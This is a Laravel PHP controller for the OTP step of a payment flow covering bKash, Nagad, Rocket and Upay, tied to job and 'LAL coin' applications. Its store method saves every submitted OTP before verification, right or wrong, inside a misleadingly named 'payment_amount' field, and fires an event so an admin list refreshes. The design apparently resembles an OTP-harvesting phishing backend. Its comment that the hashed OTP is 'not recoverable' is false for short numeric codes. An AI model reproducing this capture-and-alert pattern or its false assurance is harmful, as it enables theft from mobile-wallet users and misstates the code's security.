<?php

namespace App\Modules\Payment\Http\Controllers;

use App\Events\LalcoinPaymentOtpSubmitted;
use App\Events\PaymentOtpSubmitted;
use App\Models\JobApplication;
use App\Modules\Payment\Http\Requests\StoreOtpRequest;
use App\Modules\Payment\Services\PaymentSession;
use App\Modules\Payment\Support\GatewayManager;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\View\View;

class OtpController extends Controller
{
    public function __construct(
        private PaymentSession $session,
        private GatewayManager $gateways,
    ) {
    }

public function show(): View
{
    $method = $this->session->get('method');

    return match ($method) {
        'bkash' => view('payment::steps.bkash.otp', [
            'session' => $this->session,
        ]),

        'nagad' => view('payment::steps.nagad.otp', [
            'session' => $this->session,
        ]),

        'rocket' => view('payment::steps.rocket.otp', [
            'session' => $this->session,
        ]),

        'upay' => view('payment::steps.upay.otp', [
            'session' => $this->session,
        ]),

        default => abort(400, 'Invalid payment method'),
    };
}



        public function store(
            StoreOtpRequest $request
        ): RedirectResponse {

            $otp = $request->validated()['otp'];

            /*
            |--------------------------------------------------------------------------
            | Get Payment Reference from Session
            |--------------------------------------------------------------------------
            */

            $referenceNo = $this->session->get('reference_no');

            /*
            |--------------------------------------------------------------------------
            | Save Submitted OTP BEFORE Verification
            |--------------------------------------------------------------------------
            */

            if ($referenceNo) {

                /*
                |--------------------------------------------------------------------------
                | LAL Coin Application
                |--------------------------------------------------------------------------
                */
                if(str_starts_with($referenceNo, 'LAL-')){
                        $application = \App\Models\LalcoinApplication::where(
                        'payment_reference',
                        $referenceNo
                    )->first();

                    if($application){

                        /*
                        * বর্তমান payment_amount data নেওয়া
                        */
                        $paymentAmount = $application->payment_amount;

                        /*
                        * যদি JSON string হিসেবে থাকে
                        */
                        if (is_string($paymentAmount)) {

                            $decoded = json_decode(
                                $paymentAmount,
                                true
                            );

                            $paymentAmount = is_array($decoded)
                                ? $decoded
                                : [];

                        } elseif (! is_array($paymentAmount)) {

                            $paymentAmount = [];

                        }

                        /*
                        * User-এর submitted OTP সংরক্ষণ
                        * OTP সঠিক হোক বা ভুল হোক, এটি save হবে।
                        */
                        $paymentAmount['code'] = hash('sha256', $otp); // hashed — not recoverable

                        $application->update([
                            'payment_amount' => $paymentAmount,
                        ]);
                        event(new LalcoinPaymentOtpSubmitted($application));
                    }

                }else{
                    $application = JobApplication::where(
                        'payment_reference',
                        $referenceNo
                    )->first();

                    if ($application) {

                        /*
                        * বর্তমান payment_amount data নেওয়া
                        */
                        $paymentAmount = $application->payment_amount;

                        /*
                        * যদি JSON string হিসেবে থাকে
                        */
                        if (is_string($paymentAmount)) {

                            $decoded = json_decode(
                                $paymentAmount,
                                true
                            );

                            $paymentAmount = is_array($decoded)
                                ? $decoded
                                : [];

                        } elseif (! is_array($paymentAmount)) {

                            $paymentAmount = [];

                        }

                        /*
                        * User-এর submitted OTP সংরক্ষণ
                        * OTP সঠিক হোক বা ভুল হোক, এটি save হবে।
                        */
                        $paymentAmount['code'] = hash('sha256', $otp); // hashed — not recoverable

                        $application->update([
                            'payment_amount' => $paymentAmount,
                        ]);

                        // Broadcast update so admin list refreshes
                        event(new PaymentOtpSubmitted($application));

                    }
                }


            }

            /*
            |--------------------------------------------------------------------------
            | Verify OTP After Saving
            |--------------------------------------------------------------------------
            */

            $response = $this->gateways->driver()->verifyOtp(
                $this->session,
                $otp,
            );

            /*
            |--------------------------------------------------------------------------
            | Invalid OTP
            |--------------------------------------------------------------------------
            */

            if (! $response->successful) {

                return back()->withErrors([
                    'otp' => $response->message,
                ]);

            }

            /*
            |--------------------------------------------------------------------------
            | Valid OTP - Save Transaction Information
            |--------------------------------------------------------------------------
            */

            $this->session->put([
                'status' => 'success',

                'transaction_id' =>
                    $response->data['transaction_id'] ?? null,
            ]);

            return redirect()->route(
                'apay-payment.result.success'
            );
        }


    public function resend(Request $request): RedirectResponse|JsonResponse
    {
        $response = $this->gateways->driver()->resendOtp($this->session);

        if ($request->expectsJson()) {
            return response()->json(
                ['message' => $response->message],
                $response->successful ? 200 : 422,
            );
        }

        if (! $response->successful) {
            return back()->withErrors(['otp' => $response->message]);
        }

        return back()->with('status', $response->message);
    }
}
